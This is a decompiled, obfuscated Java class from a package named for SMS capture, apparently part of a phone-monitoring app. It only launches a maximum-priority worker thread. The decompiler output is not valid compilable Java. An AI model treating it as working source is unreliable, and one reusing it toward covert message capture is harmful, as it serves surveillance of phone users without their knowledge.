package com.vvt.capture.sms;

class e
{
  private String b;
  
  public e(c paramc, String paramString)
  {
    this.b = paramString;
  }
  
  public int a()
  {
    Thread localThread = new java/lang/Thread;
    f localf = new com/vvt/capture/sms/f;
    localf.<init>(this);
    localThread.<init>(localf);
    localThread.setPriority(10);
    localThread.start();
    localThread.getPriority();
    return 1150;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/sms/e.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */